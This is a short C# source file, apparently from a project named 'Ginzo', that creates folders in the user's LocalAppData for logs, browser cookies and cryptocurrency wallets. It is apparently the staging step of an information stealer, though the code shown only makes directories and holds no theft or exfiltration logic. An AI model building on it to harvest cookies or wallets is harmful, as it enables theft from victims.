using System;
using System.IO;

namespace Ginzo
{
    internal class Preparing
    {
        public static readonly string LogPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GinzoFolder\\";
        public static readonly string CookiesPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GinzoFolder\\Browsers\\";
        public static void PrepareAll()
        {
            DirectoryInfo genfol = new DirectoryInfo(LogPath);
            genfol.Create();
            // make browsers log folder
            DirectoryInfo brwfol = new DirectoryInfo(CookiesPath);
            brwfol.Create();
            DirectoryInfo dirInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GinzoFolder\\Wallets\\");
            dirInfo.Create();
        }
    }
}
